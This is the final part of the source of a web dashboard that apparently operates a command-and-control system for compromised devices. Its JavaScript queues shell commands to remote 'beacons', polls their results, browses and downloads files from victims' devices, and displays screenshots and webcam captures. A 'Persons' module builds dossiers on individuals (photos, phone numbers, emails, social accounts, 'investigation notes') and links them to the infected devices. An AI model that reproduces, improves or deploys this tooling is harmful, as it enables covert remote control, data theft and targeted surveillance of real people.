        '<span class="fp-l">Modified:</span>'+es(modified||'--')+'<br>';
    m.classList.add('on');
    m.onclick = function(e){if(e.target === m) m.classList.remove('on');};
}

// ── Device Files ──
function dfToggle(){
    const card = document.getElementById('df-card');
    card.classList.toggle('df-on');
    if(!card.classList.contains('df-on')) return;
    if(!SEL){ tm('Select a device first',1); card.classList.remove('df-on'); return; }
    loadDeviceFiles(SEL);
}

async function loadDeviceFiles(uuid){
    const el = document.getElementById('df-body');
    document.getElementById('df-nm').textContent = '';
    el.innerHTML = '<div class="fm-ld"><div class="sp"></div> Loading...</div>';
    const r = await ap('?action=ls_device&beacon_uuid='+uuid);
    if(!r || !r.entries || !r.entries.length){
        el.innerHTML = '<div class="fm-nf">No device files yet. Upload files or capture media to populate.</div>';
        return;
    }
    // Group by top-level directory
    const dirs = {}, files = [];
    for(const e of r.entries){
        const parts = e.path.split('/');
        if(parts.length === 1){
            // Top-level: files
            files.push(e);
        }else{
            const top = parts[0];
            if(!dirs[top]) dirs[top] = {name: top, type: 'dir', count: 0, total_size: 0};
            dirs[top].count++;
            if(e.type === 'file') dirs[top].total_size += e.size;
        }
    }
    let html = '<table class="fm-t"><thead><tr><th>Name</th><th>Items</th><th>Size</th><th></th></tr></thead><tbody>';
    for(const d of Object.values(dirs).sort((a,b) => a.name.localeCompare(b.name))){
        const sz = d.total_size > 1048576 ? (d.total_size/1048576).toFixed(1)+'M' : d.total_size > 1024 ? (d.total_size/1024).toFixed(1)+'K' : d.total_size+'B';
        html += '<tr><td class="fn" onclick="dfOpenDir(\''+es(uuid)+'\',\''+es(d.name)+'\')">&#128193; '+es(d.name)+'</td><td>'+d.count+'</td><td>'+sz+'</td><td class="act"><button class="btn btn-xs btn-gh" onclick="event.stopPropagation();dfOpenDir(\''+es(uuid)+'\',\''+es(d.name)+'\')">Open</button></td></tr>';
    }
    for(const f of files.sort((a,b) => a.name.localeCompare(b.name))){
        const sz = f.size > 1024 ? (f.size/1024).toFixed(1)+'K' : f.size+'B';
        html += '<tr><td>&#128196; '+es(f.name)+'</td><td>--</td><td>'+sz+'</td><td class="act">'+
            (f.name === 'notes.txt' ? '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();dfReadNote(\''+es(uuid)+'\')">View</button>' : '')+
            '</td></tr>';
    }
    html += '</tbody></table>';
    el.innerHTML = html;
    document.getElementById('df-nm').textContent = '('+r.entries.length+' items)';
}

async function dfOpenDir(uuid, dir){
    const el = document.getElementById('df-body');
    el.innerHTML = '<div class="fm-ld"><div class="sp"></div> Loading '+dir+'...</div>';
    const r = await ap('?action=ls_device&beacon_uuid='+uuid);
    if(!r || !r.entries){
        el.innerHTML = '<div class="fm-nf">Error loading.</div>';
        return;
    }
    const prefix = dir + '/';
    const items = r.entries.filter(e => e.path.startsWith(prefix));
    let html = '<div style="margin-bottom:6px"><button class="btn btn-xs btn-gh" onclick="loadDeviceFiles(\''+es(uuid)+'\')">&#8617; Back</button> <b style="font-size:11px">/'+es(dir)+'/</b></div>';
    html += '<table class="fm-t"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr></thead><tbody>';
    const dirs = items.filter(e => e.type === 'dir').sort((a,b) => a.name.localeCompare(b.name));
    const fils = items.filter(e => e.type === 'file').sort((a,b) => a.name.localeCompare(b.name));
    for(const e of [...dirs, ...fils]){
        const sz = e.type === 'dir' ? '--' : (e.size > 1024 ? (e.size/1024).toFixed(1)+'K' : e.size+'B');
        const mod = (e.modified||'').substring(0,16);
        const icon = e.type === 'dir' ? '&#128193;' : '&#128196;';
        const path = e.path;
        html += '<tr><td>'+icon+' '+es(e.name)+'</td><td>'+sz+'</td><td style="font-size:10px;color:var(--text2)">'+mod+'</td><td class="act">';
        if(e.type === 'file'){
            const ext = (e.name||'').split('.').pop().toLowerCase();
            if(['txt','md','json','xml','yml','yaml','ini','cfg','conf','log','sh','py','js','html','php','css','rb','pl','go','rs','toml','env','sql','csv'].includes(ext)){
                html += '<button class="btn btn-xs btn-g" onclick="event.stopPropagation();dfReadFile(\''+es(uuid)+'\',\''+es(path)+'\')">Read</button>';
            }
            if(['jpg','jpeg','png','gif','webp'].includes(ext)){
                html += '<button class="btn btn-xs btn-b" onclick="event.stopPropagation();dfViewMedia(\''+es(uuid)+'\',\''+es(path)+'\')">View</button>';
            }
            html += '<button class="btn btn-xs btn-gh" onclick="event.stopPropagation();dfDownload(\''+es(uuid)+'\',\''+es(path)+'\',\''+es(e.name)+'\')">DL</button>';
        }
        html += '</td></tr>';
    }
    html += '</tbody></table>';
    el.innerHTML = html;
}

async function dfReadFile(uuid, path){
    // Read from filesystem via API
    const r = await fetch('?action=ls_device&beacon_uuid='+uuid);
    const data = await r.json();
    const entry = data.entries.find(e => e.path === path);
    if(!entry){ tm('File not found',1); return; }
    // Load the actual file content via a direct read
    const resp = await fetch('?action=device_read&beacon_uuid='+uuid+'&path='+encodeURIComponent(path));
    if(!resp.ok){ tm('Failed to read file',1); return; }
    const text = await resp.text();
    showReadModal(text, path);
}

async function dfReadNote(uuid){
    await dfReadFile(uuid, 'notes.txt');
}

async function dfViewMedia(uuid, path){
    const img = document.getElementById('mim-s');
    img.src = '?action=device_read&beacon_uuid='+uuid+'&path='+encodeURIComponent(path);
    document.getElementById('mim').classList.add('on');
}

async function dfDownload(uuid, path, name){
    const a = document.createElement('a');
    a.href = '?action=device_read&beacon_uuid='+uuid+'&path='+encodeURIComponent(path);
    a.download = name;
    a.click();
    tm('Downloading '+name, 0);
}

async function dc(){
    const inp=document.getElementById('tin');const cmd=inp.value.trim();
    if(!cmd||!SEL){tm('Select a device',1);return;}
    inp.value='';tA(SEL,'g','$ '+cmd);tA(SEL,'s','Sent, waiting for beacon...');
    const r=await ap('?action=task',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({beacon_uuid:SEL,command:cmd})});
    if(r&&r.status==='created'){TID=r.id;poll(SEL,r.id,40)}
    else{if(TRMS[SEL]&&TRMS[SEL].length&&TRMS[SEL][TRMS[SEL].length-1].t==='s')TRMS[SEL].pop();tA(SEL,'r','Failed to send command')}
}

function qc(c){if(!SEL){tm('Select device',1);return;}document.getElementById('tin').value=c;dc()}

function poll(u,tid,n){
    let c=0;const iv=setInterval(async()=>{
        c++;const res=await ap('?action=results&task_id='+tid);
        if(res&&res.length){
            clearInterval(iv);
            if(TRMS[u]&&TRMS[u].length&&TRMS[u][TRMS[u].length-1].t==='s')TRMS[u].pop();
            const out=res[0].output||'(empty)';
            tA(u,'w',out);
            const b=await ap('?action=beacons');if(b)buildList(b);
            if(u===SEL){await loadInfo(SEL);await loadBF(SEL);await loadBM(SEL);}
            if(out.startsWith('[MEDIA]')){for(const ln of out.split('\n')){const m=ln.replace('[MEDIA]','').trim();if(m)showM(m)}}
            // Auto-cache browse results
            try{const j=JSON.parse(out);if(j.files){await ap('?action=browse_cache',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({beacon_uuid:u,path:j.path||'/tmp',entries:j.files})});if(u===SEL&&FM_PATH===(j.path||'/tmp'))fmRender(j.files,j.path||'/tmp');}}catch(e){}
        }else if(c>=n||c*5>120){clearInterval(iv);if(TRMS[u]&&TRMS[u].length&&TRMS[u][TRMS[u].length-1].t==='s')TRMS[u].pop();if(u===SEL)tA(u,'r','Timed out (beacon offline?)')}
    },5000);
}

async function loadBF(uuid){
    const el=document.getElementById('bfs');const f=await ap('?action=files&beacon_uuid='+uuid);
    if(!f||!f.length){el.innerHTML='<div style="color:var(--text2);font-size:11px">No files.</div>';return;}
    el.innerHTML='<table><thead><tr><th>File</th><th>Size</th><th>Date</th><th></th></tr></thead><tbody>'+
        f.map(x=>'<tr><td style="font-family:monospace;font-size:10px">'+es(x.filename)+'</td><td>'+(x.size>1024?(x.size/1024).toFixed(1)+'K':x.size+'B')+'</td><td style="font-size:9px">'+es((x.created_at||'').substring(5,16))+'</td><td><a href="?action=file&id='+x.id+'" download class="btn btn-xs btn-b" style="text-decoration:none">dl</a></td></tr>').join('')+
        '</tbody></table>';
}

async function loadBM(uuid){
    const el=document.getElementById('bme');const m=await ap('?action=media&beacon_uuid='+uuid);
    document.getElementById('mcn').textContent=m&&m.length?'('+m.length+')':'';
    if(!m||!m.length){el.innerHTML='<div style="color:var(--text2);font-size:11px">Send screenshot or cam command.</div>';return;}
    el.innerHTML='<div class="mg">'+m.map(x=>'<div class="mi" onclick="showM('+x.id+')"><img src="?action=media&id='+x.id+'" loading="lazy" onerror="this.remove()"><div class="mi2">'+es(x.type)+'</div></div>').join('')+'</div>';
}
function showM(id){document.getElementById('mim-s').src='?action=media&id='+id;document.getElementById('mim').classList.add('on')}

// ── Persons / CTOS ──
async function loadPersons(){
    const ps=await ap('?action=persons');
    if(!ps)return;
    document.getElementById('pcnt').textContent='('+ps.length+')';
    const el=document.getElementById('plist');
    if(!ps.length){el.innerHTML='<div style="padding:20px;text-align:center;color:var(--text2);font-size:10px">No persons. Add one.</div>';return;}
    el.innerHTML='<div class="pr-cards">'+ps.map(p=>{
        const dc=p.linked_devices?p.linked_devices.length:0;
        const av=p.photo?`<img src="?action=person_photo_get&id=${p.id}" class="pr-av-sm" onerror="this.outerHTML='<div class=\\'pr-av-sm\\' style=\\'display:flex;align-items:center;justify-content:center;font-size:18px;background:var(--surface)\\'>\\&#128100;</div>'">`:'<div class="pr-av-sm" style="display:flex;align-items:center;justify-content:center;font-size:18px;background:var(--surface)">&#128100;</div>';
        const created=((p.created_at||'').substring(5,16)||'');
        const updated=((p.updated_at||'').substring(5,16)||'');
        const timeStr=created?(updated!==created?created+' cr':created):'';
        const handle=p.social?(p.social.twitter||p.social.instagram||p.social.telegram||''):'';
        return `<div class="pr-card" onclick="openPerson('${p.id}')">${av}<div class="pr-ci"><div class="pr-cn">${es(p.name)}</div><div class="pr-cs">${dc>0?dc+' device(s)':''}${handle?' <span style="opacity:.7">'+es(handle)+'</span>':''}${timeStr?' <span style="opacity:.5">| '+timeStr+'</span>':''}</div></div></div>`;
    }).join('')+'</div>';
}

async function openPerson(id){
    const p=await ap('?action=person&id='+id);
    if(!p||!p.id){tm('Person not found',1);document.getElementById('pm').classList.remove('on');return;}
    const dc=p.linked_devices?p.linked_devices.length:0;
    const beacons=await ap('?action=beacons');
    const devHtml=p.linked_devices&&p.linked_devices.length?p.linked_devices.map(d=>{
        const b=beacons?beacons.find(x=>x.uuid===d):null;
        const nm=b?es(b.nickname||b.hostname||b.uuid.substring(0,8)):d.substring(0,8);
        return `<span class="pr-dt" onclick="selB('${d}')">${nm}<span class="pr-dx" onclick="event.stopPropagation();linkDevice('${p.id}','${d}',true)">&times;</span></span>`;
    }).join(''):'<span style="font-size:10px;color:var(--text2)">No devices linked</span>';

    const av=p.photo?`<img src="?action=person_photo_get&id=${p.id}" class="pr-av" onerror="this.outerHTML='<div class=\\'pr-av\\' style=\\'display:flex;align-items:center;justify-content:center;font-size:28px;border-radius:50%\\'>&#128100;</div>'">`:'<div class="pr-av" style="display:flex;align-items:center;justify-content:center;font-size:28px">&#128100;</div>';

    const beaconsSel=beacons?beacons.filter(x=>!p.linked_devices||!p.linked_devices.includes(x.uuid)).map(x=>`<option value="${x.uuid}">${es(x.nickname||x.hostname||x.uuid.substring(0,8))}</option>`).join(''):'';

    document.getElementById('pm-c').innerHTML=`
        <div style="padding:14px">
            <div style="display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:10px">
                <div>
                    <b style="font-size:15px">&#128100; ${es(p.name)}</b>
                    <div style="font-size:9px;color:var(--text2);margin-top:2px;font-family:monospace">ID: ${es(p.id)}</div>
                </div>
                <span>
                    <button class="btn btn-xs btn-gh" onclick="personForm('${p.id}')">Edit</button>
                    <button class="btn btn-xs btn-r" onclick="if(confirm('Delete person?'))deletePerson('${p.id}')">Delete</button>
                    <button class="btn btn-xs btn-gh" onclick="document.getElementById('pm').classList.remove('on')">Close</button>
                </span>
            </div>
            <div style="font-size:9px;color:var(--text2);margin-bottom:8px">&#128337; Created: ${p.created_at||'-'} | Updated: ${p.updated_at||'-'}</div>
            <div class="pr-rw">
                ${av}
                <div class="pr-info">
                    <div class="ps">ID: ${es(p.id)}</div>
                    ${p.info?'<div class="pd">'+es(p.info)+'</div>':''}
                    <div style="margin-top:6px"><b style="font-size:10px;color:var(--text2)">&#128221; Notes</b>
                    <div class="pd" style="font-size:11px">${p.notes?es(p.notes):'<span style="color:var(--text2)">No notes.</span>'}</div></div>
                </div>
            </div>
            ${p.social?`<div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128279; Social / Contact</b>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:3px;margin-top:4px;font-size:11px">${
                Object.entries(p.social).filter(([,v])=>v).map(([k,v])=>{
                    const icons={twitter:'&#120143;',instagram:'&#128247;',phone:'&#128222;',email:'&#9993;',telegram:'&#128172;',whatsapp:'&#128225;',signal:'&#128100;',facebook:'&#128262;'};
                    const icon=icons[k]||'&#128279;';
                    const links={twitter:'https://twitter.com/',instagram:'https://instagram.com/',facebook:'https://facebook.com/',telegram:'https://t.me/',email:'mailto:',whatsapp:'https://wa.me/',phone:'tel:',signal:'https://signal.me/'};
                    const link=links[k]||'';
                    const display=link&&k!=='email'&&k!=='phone'&&k!=='whatsapp'&&k!=='signal'?v.replace(/^@/,''):v;
                    const href=link+(k==='email'||k==='phone'||k==='whatsapp'||k==='signal'?v.replace(/[^0-9+]/g,''):display);
                    return `<span>${icon} <a href="${href}" target="_blank" style="color:var(--cyan)">${es(v)}</a></span>`;
                }).join('')
            }</div></div>`:''}
            <div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128268; Linked Devices</b>
            <div class="pr-dev">${devHtml}</div></div>
            <div style="margin-top:6px;display:flex;gap:4px"><select id="pl-ds" style="flex:1"><option value="">${beaconsSel?'Link a device...':'No devices available'}</option>${beaconsSel||''}</select>${beaconsSel?'<button class="btn btn-xs btn-g" onclick="linkDeviceFromPerson(\''+p.id+'\')">Link</button>':''}</div>
            <div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128247; Photo</b>
            <div style="margin-top:4px;display:flex;gap:4px"><input type="file" id="pf-upload" accept="image/*" style="flex:1;font-size:10px"><button class="btn btn-xs btn-b" onclick="uploadPersonPhoto('+p.id+')">Upload</button></div></div>
            <div style="margin-top:8px"><b style="font-size:10px;color:var(--text2)">&#128193; Files <span id="hf-cnt-${es(p.id)}"></span></b>
            <div id="hf-body-${es(p.id)}" style="font-size:10px;color:var(--text2);margin-top:4px">Loading...</div></div>
        </div>`;
    document.getElementById('pm').classList.add('on');
    // Load human files
    (async()=>{
        const hf=await ap('?action=human_files&id='+p.id);
        const hfe=document.getElementById('hf-body-'+p.id);
        const hfc=document.getElementById('hf-cnt-'+p.id);
        if(!hf||!hf.entries||!hf.entries.length){hfe.innerHTML='<span style="color:var(--text2)">No files.</span>';hfc.textContent='';return;}
        hfc.textContent='('+hf.entries.length+')';
        hfe.innerHTML='<div style="display:flex;flex-direction:column;gap:2px">'+hf.entries.map(e=>{
            const icon=e.type==='dir'?'&#128193;':'&#128196;';
            const sz=e.size>1024?(e.size/1024).toFixed(1)+'K':e.size+'B';
            if(e.type==='dir') return '<span style="color:var(--cyan)">'+icon+' '+es(e.name)+'</span>';
            return '<span style="display:flex;justify-content:space-between"><span>'+icon+' <a href="?action=human_file_read&id='+p.id+'&file='+es(e.name)+'" target="_blank" style="color:var(--text)">'+es(e.name)+'</a></span><span style="color:var(--text2)">'+sz+'</span></span>';
        }).join('')+'</div>';
    })();
}

function personForm(id){
    // Load beacons for device selector
    (async()=>{
    const beacons=await ap('?action=beacons');
    const devOpts=beacons&&beacons.length?beacons.map(x=>`<option value="${x.uuid}">${es(x.nickname||x.hostname||x.uuid.substring(0,8))}</option>`).join(''):'';
    const p=id?await ap('?action=person&id='+id):null;
    const linked=p&&p.linked_devices?p.linked_devices:[];
    const soc=p&&p.social?p.social:{};
    document.getElementById('pm-c').innerHTML=`
        <div style="padding:14px">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
                <b style="font-size:13px">${id?'Edit Person':'New Person'}</b>
                <button class="btn btn-xs btn-gh" onclick="document.getElementById('pm').classList.remove('on')">Close</button>
            </div>
            <div class="pr-form">
                <label>Name *</label>
                <input id="pf-name" placeholder="Full name" value="${p?es(p.name):''}">
                <label>Info (description, alias, etc.)</label>
                <textarea id="pf-info" placeholder="e.g. Known associate, last seen at...">${p?es(p.info):''}</textarea>
                <label style="margin-top:8px;font-weight:700;color:var(--text)">&#128279; Social / Contact</label>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px">
                    <div><label>&#64; Twitter/X</label><input id="pf-twitter" placeholder="@username" value="${es(soc.twitter||'')}"></div>
                    <div><label>&#128247; Instagram</label><input id="pf-instagram" placeholder="@username" value="${es(soc.instagram||'')}"></div>
                    <div><label>&#128222; Phone</label><input id="pf-phone" placeholder="+1 234 567 890" value="${es(soc.phone||'')}"></div>
                    <div><label>&#9993; Email</label><input id="pf-email" placeholder="email@example.com" value="${es(soc.email||'')}"></div>
                    <div><label>&#128172; Telegram</label><input id="pf-telegram" placeholder="@username" value="${es(soc.telegram||'')}"></div>
                    <div><label>&#128225; WhatsApp</label><input id="pf-whatsapp" placeholder="+1 234 567 890" value="${es(soc.whatsapp||'')}"></div>
                    <div><label>&#128100; Signal</label><input id="pf-signal" placeholder="+1 234 567 890" value="${es(soc.signal||'')}"></div>
                    <div><label>&#128262; Facebook</label><input id="pf-facebook" placeholder="username" value="${es(soc.facebook||'')}"></div>
                </div>
                <label style="margin-top:8px">&#128221; Notes</label>
                <textarea id="pf-notes" placeholder="Investigation notes..." style="min-height:80px">${p?es(p.notes):''}</textarea>
                <label>&#128268; Link Device</label>
                <select id="pf-dev"><option value="">${devOpts?'Select a device to link...':'No devices available'}</option>${devOpts}</select>
                ${id&&linked.length?`<div style="font-size:10px;color:var(--cyan);margin-top:2px">Linked: ${linked.map(d=>{const b=beacons?beacons.find(x=>x.uuid===d):null;return b?es(b.nickname||b.hostname||d.substring(0,8)):d.substring(0,8);}).join(', ')}</div>`:''}
                <div style="margin-top:8px;display:flex;gap:4px;justify-content:flex-end">
                    <button class="btn btn-xs btn-gh" onclick="document.getElementById('pm').classList.remove('on')">Cancel</button>
                    <button class="btn btn-xs btn-g" onclick="savePerson('${id||''}')">Save</button>
                </div>
            </div>
        </div>`;
    document.getElementById('pm').classList.add('on');
    })();
}

async function savePerson(id){
    const name=document.getElementById('pf-name').value.trim();
    if(!name){tm('Name required',1);return;}
    const info=document.getElementById('pf-info').value;
    const notes=document.getElementById('pf-notes').value;
    const social={
        twitter: document.getElementById('pf-twitter')?.value||'',
        instagram: document.getElementById('pf-instagram')?.value||'',
        phone: document.getElementById('pf-phone')?.value||'',
        email: document.getElementById('pf-email')?.value||'',
        telegram: document.getElementById('pf-telegram')?.value||'',
        whatsapp: document.getElementById('pf-whatsapp')?.value||'',
        signal: document.getElementById('pf-signal')?.value||'',
        facebook: document.getElementById('pf-facebook')?.value||''
    };
    // Strip empty keys
    Object.keys(social).forEach(k=>{if(!social[k])delete social[k];});
    if(id){
        const r=await ap('?action=person',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,name,info,notes,social})});
        if(r&&r.status==='ok'){
            // Link device if selected
            const dev=document.getElementById('pf-dev');
            if(dev&&dev.value){await linkDevice(id,dev.value,false,true);}
            tm('Person updated');document.getElementById('pm').classList.remove('on');loadPersons();
            if(SEL)loadInfo(SEL);
        }
        else tm('Failed to update',1);
    }else{
        const r=await ap('?action=persons',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,info,notes,social})});
        if(r&&r.id){
            // Link device if selected
            const dev=document.getElementById('pf-dev');
            if(dev&&dev.value){await linkDevice(r.id,dev.value,false,true);}
            tm('Person created');document.getElementById('pm').classList.remove('on');loadPersons();
            if(SEL)loadInfo(SEL);
        }
        else tm('Failed to create',1);
    }
}

async function deletePerson(id){
    if(!id){tm('Invalid person ID',1);return;}
    const r=await ap('?action=person_delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});
    if(r&&r.status==='ok'){tm('Person deleted');document.getElementById('pm').classList.remove('on');loadPersons();if(SEL)loadInfo(SEL);}
    else tm('Failed to delete'+(r&&r.error?': '+r.error:'') ,1);
}

async function linkDevice(personId,beaconUuid,unlink,quiet){
    const r=await ap('?action=person_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({person_id:personId,beacon_uuid:beaconUuid,unlink:!!unlink})});
    if(r&&r.status==='ok'){loadPersons();if(!quiet){openPerson(personId);if(!unlink)tm('Device linked');}if(SEL)loadInfo(SEL);}
    else if(!quiet)tm('Failed to link',1);
}

async function linkDeviceFromPerson(personId){
    const sel=document.getElementById('pl-ds');
    if(!sel.value){tm('Select a device',1);return;}
    await linkDevice(personId,sel.value,false);
}

async function uploadPersonPhoto(id){
    const fileInput=document.getElementById('pf-upload');
    if(!fileInput.files||!fileInput.files[0]){tm('Select an image',1);return;}
    const reader=new FileReader();
    reader.onload=async function(e){
        const b64=e.target.result.split(',')[1];
        const r=await ap('?action=person_photo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,data:b64})});
        if(r&&r.status==='ok'){tm('Photo uploaded');openPerson(id);loadPersons();}
        else tm('Failed to upload photo',1);
    };
    reader.readAsDataURL(fileInput.files[0]);
}

function getPersonForDevice(uuid,persons){
    if(!persons||!uuid)return null;
    return persons.find(p=>p.linked_devices&&p.linked_devices.includes(uuid))||null;
}

async function linkDevicePerson(sel,uuid){
    const pid=sel.value;
    if(!pid)return;
    const r=await ap('?action=person_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({person_id:pid,beacon_uuid:uuid})});
    if(r&&r.status==='ok'){tm('Device linked');await loadInfo(uuid);loadPersons();}
    else tm('Failed to link',1);
}

async function unlinkDevicePerson(pid,uuid){
    const r=await ap('?action=person_link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({person_id:pid,beacon_uuid:uuid,unlink:true})});
    if(r&&r.status==='ok'){tm('Device unlinked');await loadInfo(uuid);loadPersons();}
    else tm('Failed to unlink',1);
}

async function ref(){
    const b=await ap('?action=beacons');if(!b)return;
    const t=await ap('?action=tasks');const m=await ap('?action=media');const f=await ap('?action=files');
    const tot=b.length,act=b.filter(x=>x.status==='active').length;
    const pend=t?t.filter(x=>x.status==='pending'||x.status==='assigned').length:0;
    const done=t?t.filter(x=>x.status==='completed').length:0;
    document.getElementById('s-act').textContent=act;document.getElementById('s-dead').textContent=tot-act;
    document.getElementById('s-tot').textContent=tot;document.getElementById('s-pend').textContent=pend;
    document.getElementById('s-done').textContent=done;
    loadPersons();
    // Check if selected beacon went dead
    if(SEL){
        const be=b.find(x=>x.uuid===SEL);
        if(be&&be.status!=='active'){
            // Update visual
            document.querySelector(`.bit[data-u="${SEL}"] .dd`).style.background='var(--red)';
        }
    }
    buildList(b);
}

ref();setInterval(ref,6000);
</script>
</body>
</html>
<?php }